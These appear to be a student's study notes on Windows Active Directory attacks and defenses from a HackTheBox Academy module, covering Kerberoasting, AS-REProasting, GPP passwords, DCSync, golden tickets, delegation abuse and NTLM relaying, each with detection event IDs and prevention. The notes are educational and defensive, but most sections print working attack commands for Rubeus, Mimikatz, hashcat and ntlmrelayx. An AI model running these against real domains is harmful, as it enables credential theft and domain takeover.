# Windows Attacks & Defense

Brief notes taken from the Windows Attacks & Defense module in HackTheBox Acedemy to study for the SOC Analyst exam.


## Review of terms
A domain is a group of objects that share the same AD database, such as users or devices.

A tree is one or more domains grouped. Think of this as the domains test.local, staging.test.local, and preprod.test.local, which will be in the same tree under test.local. Multiple trees can exist in this notation.

A forest is a group of multiple trees. This is the topmost level, which is composed of all domains.

Organizational Units (OU) are Active Directory containers containing user groups, Computers, and other OUs.

Trust can be defined as access between resources to gain permission/access to resources in another domain.

Domain Controller is (generally) the Admin of the Active Directory used to set up the entire Directory. The role of the Domain Controller is to provide Authentication and Authorization to different services and users. In Active Directory, the Domain Controller has the topmost priority and has the most authority/privileges.

Active Directory Data Store contains Database files and processes that store and manages directory information for users, services, and applications. Active Directory Data Store contains the file NTDS.DIT, the most critical file within an AD environment; domain controllers store it in the %SystemRoot%\NTDS folder.

LDAP is a protocol that systems in the network environment use to communicate with Active Directory. Domain Controller(s) run LDAP and constantly listen for requests from the network.

Key Distribution Center (KDC): a Kerberos service installed on a DC that creates tickets. Components of the KDC are the authentication server (AS) and the ticket-granting server (TGS).

Kerberos Tickets are tokens that serve as proof of identity (created by the KDC):

- TGT is proof that the client submitted valid user information to the KDC.
- TGS is created for each service the client (with a valid TGT) wants to access.

KDC key is an encryption key that proves the TGT is valid. AD creates the KDC key from the hashed password of the KRBTGT account, the first account created in an AD domain. Although it is a disabled user, KRBTGT has the vital purpose of storing secrets that are randomly generated keys in the form of password hashes. One may never know what the actual password value represents (even if we try to configure it to a known value, AD will automatically override it to a random one).

### Important Ports

- 88: Kerberos.
- 135: WMI/RPC.
- 137-139 & 445: SMB.
- 389 & 636: LDAP.
- 3389: RDP
- 5985 & 5986: PowerShell Remoting (WinRM)

### Connecting to SMB client on Linux
```
smbclient \\\\TARGET_IP\\Share -U DOMAIN/USERNAME%PASSWORD
```

## Kerberoasting
Kerberoasting is a post-exploitation attack that attempts to exploit this behavior by obtaining a ticket and performing offline password cracking to open the ticket. If the ticket opens, then the candidate password that opened the ticket is the service account's password. The success of this attack depends on the strength of the service account's password. Another factor that has some impact is the encryption algorithm used when the ticket is created, with the likely options being:

- AES
- RC4
- DES (found in environments that are 15+ old years old with legacy apps from the early 2000s, otherwise, this will be disabled)

To obtain crackable tickets, we can use Rubeus. When we run the tool with the kerberoast action without specifying a user, it will extract tickets for every user that has an SPN registered.
```
PS C:\Users\bob\Downloads> .\Rubeus.exe kerberoast /outfile:spn.txt
```

We can use hashcat with the hash-mode (option -m) 13100 for a Kerberoastable TGS. We also pass a dictionary file with passwords (the file passwords.txt) and save the output of any successfully cracked tickets to a file called cracked.txt:
```
thossa00@htb[/htb]$ hashcat -m 13100 -a 0 spn.txt passwords.txt --outfile="cracked.txt"
```

Alternatively, the captured TGS hashes can be cracked with John The Ripper:
```
sudo john spn.txt --fork=4 --format=krb5tgs --wordlist=passwords.txt --pot=results.pot
```

### Detection
When a TGS is requested, an event log with ID 4769 is generated. However, AD also generates the same event ID whenever a user attempts to connect to a service, which means that the volume of this event is gigantic, and relying on it alone is virtually impossible to use as a detection method.

Even though the general volume of this event is quite heavy, we still can alert against the default option on many tools. When we run 'Rubeus', it will extract a ticket for each user in the environment with an SPN registered; this allows us to alert if anyone generates more than ten tickets within a minute (for example, but it could be less than ten). This event ID should be grouped by the user requesting the tickets and the machine the requests originated from. Ideally, we need to aim to create two separate rules that alert both.

A honeypot user is a perfect detection option to configure in an AD environment; this must be a user with no real use/need in the environment, so no service tickets are generated regularly. In this case, any attempt to generate a service ticket for this account is likely malicious and worth inspecting. 

Question 2#: 

```
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4769} |
 ForEach-Object {
 $xml = [xml]$_.ToXml()
 $eventData = $xml.Event.EventData.Data
 New-Object PSObject -Property @{
     MachineName = $eventData | Where-Object {$_.Name -eq "AccountName"} | Select-Object -ExpandProperty '#text'
     UserID = $eventData | Where-Object {$_.Name -eq "ServiceName"} | Select-Object -ExpandProperty '#text'
     SID = $eventData | Where-Object {$_.Name -eq "ServiceSid"} | Select-Object -ExpandProperty '#text'
}} | Where{$_.UserID -like 'web*'}
```
## AS-REProasting
The AS-REProasting attack is similar to the Kerberoasting attack; we can obtain crackable hashes for user accounts that have the property Do not require Kerberos preauthentication enabled. The success of this attack depends on the strength of the user account password that we will crack.

We can use Rubeus again. However, this time, we will use the asreproast action. If we don't specify a name, Rubeus will extract hashes for each user that has Kerberos preauthentication not required:
```
PS C:\Users\bob\Downloads> .\Rubeus.exe asreproast /outfile:asrep.txt
```

For hashcat to be able to recognize the hash, we need to edit it by adding 23$ after $krb5asrep$:
```
# Edit txt file
$krb5asrep$23$anni@eagle.local:1b912b858c4551c0013dbe81ff0f01d7$c64803358a43d05383e9e01374e8f2b2c92f9d6c669cdc4a1b9c1ed684c7857c965b8e44a285bc0e2f1bc248159aa7448494de4c1f997382518278e375a7a4960153e13dae1cd28d05b7f2377a038062f8e751c1621828b100417f50ce617278747d9af35581e38c381bb0a3ff246912def5dd2d53f875f0a64c46349fdf3d7ed0d8ff5a08f2b78d83a97865a3ea2f873be57f13b4016331eef74e827a17846cb49ccf982e31460ab25c017fd44d46cd8f545db00b6578150a4c59150fbec18f0a2472b18c5123c34e661cc8b52dfee9c93dd86e0afa66524994b04c5456c1e71ccbd2183ba0c43d2550

thossa00@htb[/htb]$ sudo hashcat -m 18200 -a 0 asrep.txt passwords.txt --outfile asrepcrack.txt --force
```
### Prevention
We should only use this property if needed; a good practice is to review accounts quarterly to ensure that we have not assigned this property. Because this property is often found with some regular user accounts, they tend to have easier-to-crack passwords than service accounts with SPNs (those from Kerberoast). Therefore, for users requiring this configured, we should assign a separate password policy, which requires at least 20 characters to thwart cracking attempts.



### Detection
When we executed Rubeus, an Event with ID 4768 was generated, signaling that a Kerberos Authentication ticket was generated.

PS Script used to find event:
```
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4768} |
>>   ForEach-Object {
>>   $xml = [xml]$_.ToXml()
>>   $eventData = $xml.Event.EventData.Data
>>   New-Object PSObject -Property @{
>>       MachineName = $eventData | Where-Object {$_.Name -eq "Computer"} | Select-Object -ExpandProperty '#text'
>>       UserID = $eventData | Where-Object {$_.Name -eq "TargetUserName"} | Select-Object -ExpandProperty '#text'
>>       SID = $eventData | Where-Object {$_.Name -eq "TargetSid"} | Select-Object -ExpandProperty '#text'
>> }} | Where{$_.UserID -like 'svc*'}
```

## GPP Passwords
AD stores all group policies in \\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\. When Microsoft released it with the Windows Server 2008, Group Policy Preferences (GPP) introduced the ability to store and use credentials in several scenarios, all of which AD stores in the policies directory in SYSVOL.

During engagements, we might encounter scheduled tasks and scripts executed under a particular user and contain the username and an encrypted version of the password in XML policy files. The encryption key that AD uses to encrypt the XML policy files (the same for all Active Directory environments) was released on Microsoft Docs, allowing anyone to decrypt credentials stored in the policy files. Anyone can decrypt the credentials because the SYSVOL folder is accessible to all 'Authenticated Users' in the domain, which includes users and computers. 

To abuse GPP Passwords, we will use the Get-GPPPassword function from PowerSploit, which automatically parses all XML files in the Policies folder in SYSVOL, picking up those with the cpassword property and decrypting them once detected:
```
PS C:\Users\bob\Downloads> Import-Module .\Get-GPPPassword.ps1
PS C:\Users\bob\Downloads> Get-GPPPassword
```

### Prevention
Once the encryption key was made public and started to become abused, Microsoft released a patch (KB2962486) in 2014 to prevent caching credentials in GPP. Therefore, GPP should no longer store passwords in new patched environments. However, unfortunately, there are a multitude of Active Directory environments built after 2015, which for some reason, do contain credentials in SYSVOL.

### Detection
There are two detection techniques for this attack:

- Accessing the XML file containing the credentials should be a red flag if we are auditing file access; this is more realistic (due to volume otherwise) regarding detection if it is a dummy XML file, not associated with any GPO. In this case, there will be no reason for anyone to touch this file, and any attempt is likely suspicious. As demonstrated by Get-GPPPasswords, it parses all of the XML files in the Policies folder. For auditing, we can generate an event whenever a user reads the file.

Once auditing is enabled, any access to the file will generate an Event with the ID 4663

- Logon attempts (failed or successful, depending on whether the password is up to date) of the user whose credentials are exposed is another way of detecting the abuse of this attack; this should generate one of the events 4624 (successful logon), 4625 (failed logon), or 4768 (TGT requested).

## GPO Permissions/GPO Files
A Group Policy Object (GPO) is a virtual collection of policy settings that has a unique name. GPOs are the most widely used configuration management tool in Active Directory. Each GPO contains a collection of zero or more policy settings. 

### Prevention
One way to prevent this attack is to lock down the GPO permissions to be modified by a particular group of users only or by a specific account, as this will significantly limit the ability of who can edit the GPO or change its permissions (as opposed to everybody in Domain admins, which in some organizations can easily be more than 50). Similarly, never deploy files stored in network locations so that many users can modify the share permissions.

### Detection
 If Directory Service Changes auditing is enabled, then the event ID 5136 will be generated. From a defensive point of view, if a user who is not expected to have the right to modify a GPO suddenly appears here, then a red flag should be raised.

 ```
# Define filter for the last 15 minutes
$TimeSpan = (Get-Date) - (New-TimeSpan -Minutes 15)

# Search for event ID 5136 (GPO modified) in the past 15 minutes
$Logs = Get-WinEvent -FilterHashtable @{LogName='Security';id=5136;StartTime=$TimeSpan} -ErrorAction SilentlyContinue |`
Where-Object {$_.Properties[8].Value -match "CN={73C66DBB-81DA-44D8-BDEF-20BA2C27056D},CN=POLICIES,CN=SYSTEM,DC=EAGLE,DC=LOCAL"}


if($Logs){
    $emailBody = "Honeypot GPO '73C66DBB-81DA-44D8-BDEF-20BA2C27056D' was modified`r`n"
    $disabledUsers = @()
    ForEach($log in $logs){
        If(((Get-ADUser -identity $log.Properties[3].Value).Enabled -eq $true) -and ($log.Properties[3].Value -notin $disabledUsers)){
            Disable-ADAccount -Identity $log.Properties[3].Value
            $emailBody = $emailBody + "Disabled user " + $log.Properties[3].Value + "`r`n"
            $disabledUsers += $log.Properties[3].Value
        }
    }
    # Send an alert via email - complete the command below
    # Send-MailMessage
    $emailBody
}
```

## Credentials in Shares
### Attack
The first step is identifying what shares exist in a domain using PowerView's Invoke-ShareFinder. This function allows specifying that default shares should be filtered out (such as c$ and IPC$) and also check if the invoking user has access to the rest of the shares it finds. The final output contains a list of non-default shares that the current user account has at least read access to:
```
PS C:\Users\bob\Downloads> Invoke-ShareFinder -domain eagle.local -ExcludeStandard -CheckShareAccess
```

Because of the dollar sign, if we were to browse the server which contains the share using Windows Explorer, we would be presented with an empty list (shares such as C$ and IPC$ even though available by default, Explorer does not display them because of the dollar sign). However, since we have the UNC path from the output, if we browse to it, we will be able to see the contents inside the share.

A few automated tools exist, such as SauronEye, which can parse a collection of files and pick up matching words. However, because there are few shares in the playground, we will take a more manual approach (Living Off the Land) and use the built-in command findstr for this attack. When running findstr, we will specify the following arguments:

- /s forces to search the current directory and all subdirectories
- /i ignores case in the search term
- /m shows only the filename for a file that matches the term. 
- The term that defines what we are looking for. Good candidates include pass, pw, and the NETBIOS name of the domain.
```
PS C:\Users\bob\Downloads> cd \\Server01.eagle.local\dev$
PS Microsoft.PowerShell.Core\FileSystem::\\Server01.eagle.local\dev$> findstr /m /s /i "pass" *.bat
PS Microsoft.PowerShell.Core\FileSystem::\\Server01.eagle.local\dev$> findstr /m /s /i "pass" *.cmd
PS Microsoft.PowerShell.Core\FileSystem::\\Server01.eagle.local\dev$> findstr /m /s /i "pass" *.ini
setup.ini
PS Microsoft.PowerShell.Core\FileSystem::\\Server01.eagle.local\dev$> findstr /m /s /i "pass" *.config
4\5\4\web.config
```

```
PS Microsoft.PowerShell.Core\FileSystem::\\Server01.eagle.local\dev$> findstr /m /s /i "pw" *.config

5\2\3\microsoft.config
PS Microsoft.PowerShell.Core\FileSystem::\\Server01.eagle.local\dev$> findstr /s /i "pw" *.config
5\2\3\microsoft.config:pw BANANANANANANANANANANANANNAANANANANAS
```

### Prevention
The best practice to prevent these attacks is to lock down every share in the domain so there are no loose permissions.

Technically, there is no way to prevent what users leave behind them in scripts or other exposed files, so performing regular scans (e.g., weekly) on AD environments to identify any new open shares or credentials exposed in older ones is necessary.

### Detection
A detection technique is discovering the one-to-many connections, for example, when Invoke-ShareFinder scans every domain device to obtain a list of its network shares. It would be abnormal for a workstation to connect to 100s or even 1000s of other devices simultaneously.

## Credentials in Object Properties
### Attack
A simple PowerShell script can query the entire domain by looking for specific search terms/strings in the Description or Info fields:

```
Function SearchUserClearTextInformation
{
    Param (
        [Parameter(Mandatory=$true)]
        [Array] $Terms,

        [Parameter(Mandatory=$false)]
        [String] $Domain
    )

    if ([string]::IsNullOrEmpty($Domain)) {
        $dc = (Get-ADDomain).RIDMaster
    } else {
        $dc = (Get-ADDomain $Domain).RIDMaster
    }

    $list = @()

    foreach ($t in $Terms)
    {
        $list += "(`$_.Description -like `"*$t*`")"
        $list += "(`$_.Info -like `"*$t*`")"
    }

    Get-ADUser -Filter * -Server $dc -Properties Enabled,Description,Info,PasswordNeverExpires,PasswordLastSet |
        Where { Invoke-Expression ($list -join ' -OR ') } | 
        Select SamAccountName,Enabled,Description,Info,PasswordNeverExpires,PasswordLastSet | 
        fl
}
```
```
PS C:\Users\bob\Downloads> SearchUserClearTextInformation -Terms "pass"
```

### Prevention
- Perform continuous assessments to detect the problem of storing credentials in properties of objects.
- Educate employees with high privileges to avoid storing credentials in properties of objects.
- Automate as much as possible of the user creation process to ensure that administrators don't handle the accounts manually, reducing the risk of introducing hardcoded credentials in user objects.

## DCSync
DCSync is an attack that threat agents utilize to impersonate a Domain Controller and perform replication with a targeted Domain Controller to extract password hashes from Active Directory. The attack can be performed both from the perspective of a user account or a computer, as long as they have the necessary permissions assigned, which are:

- Replicating Directory Changes
- Replicating Directory Changes All

```
runas /user:DOMAIN\(Username with Directory Change Privilege) cmd.exe
```
```
C:\Mimikatz>mimikatz.exe

mimikatz # lsadump::dcsync /domain:eagle.local /user:Administrator
```
It is possible to specify the /all parameter instead of a specific username, which will dump the hashes of the entire AD environment. We can perform pass-the-hash with the obtained hash and authenticate against any Domain Controller.

### Prevention
The only prevention technique against this attack is using solutions such as the RPC Firewall, a third-party product that can block or allow specific RPC calls with robust granularity. For example, using RPC Firewall, we can only allow replications from Domain Controllers.

### Detection
Detecting DCSync is easy because each Domain Controller replication generates an event with the ID 4662. We can pick up abnormal requests immediately by monitoring for this event ID and checking whether the initiator account is a Domain Controller.

Since replications occur constantly, we can avoid false positives by ensuring the followings:

- Either the property 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 or 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 is present in the event.
- Whitelisting systems/accounts with a (valid) business reason for replicating, such as Azure AD Connect (this service constantly replicates Domain Controllers and sends the obtained password hashes to Azure AD).

## Golden Ticket
First, we need to obtain the password's hash of krbtgt and the SID value of the Domain. We can utilize DCSync from the previous attack to obtain the hash:
```
C:\Mimikatz>mimikatz.exe
mimikatz # lsadump::dcsync /domain:eagle.local /user:krbtgt
```
```
PS C:\Users\bob\Downloads> powershell -exec bypass
.\PowerView.ps1

Get-DomainSID
```
```
C:\Mimikatz>mimikatz.exe
mimikatz # kerberos::golden /domain:eagle.local /sid:S-1-5-21-1518138621-4282902758-752445584 /rc4:db0d0630064747072a7da3f7c3b4069e /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt

exit

# klist
```

## Kerberos Constrained Delegation
```
import-module  PowerView-main.ps1
Get-NetUser -TrustedToAuth

.\Rubeus.exe hash /password:Slavi123
.\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /domain:eagle.local /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:dc1.eagle.local /ptt

klist
```
## Print Spooler & NTLM Relaying
In this attack path, we will relay the connection to another DC and perform DCSync (i.e., the first compromise technique listed). For the attack to succeed, SMB Signing on Domain Controllers must be turned off.

To begin, we will configure NTLMRelayx to forward any connections to DC2 and attempt to perform the DCSync attack:
```
thossa00@htb[/htb]$ impacket-ntlmrelayx -t dcsync://172.16.18.4 -smb2support

python3 ./dementor.py 172.16.18.20 172.16.18.3 -u bob -d eagle.local -p Slavi123
```
The impact of PrinterBug is that any Domain Controller that has the Print Spooler enabled can be compromised in one of the following ways:

1. Relay the connection to another DC and perform DCSync (if SMB Signing is disabled).
2. Force the Domain Controller to connect to a machine configured for Unconstrained Delegation (UD) - this will cache the TGT in the memory of the UD server, which can be captured/exported with tools like Rubeus and Mimikatz.
3. Relay the connection to Active Directory Certificate Services to obtain a certificate for the Domain Controller. Threat agents can then use the certificate on-demand to authenticate and pretend to be the Domain Controller (e.g., DCSync).
4. Relay the connection to configure Resource-Based Kerberos Delegation for the relayed machine. We can then abuse the delegation to authenticate as any Administrator to that machine.
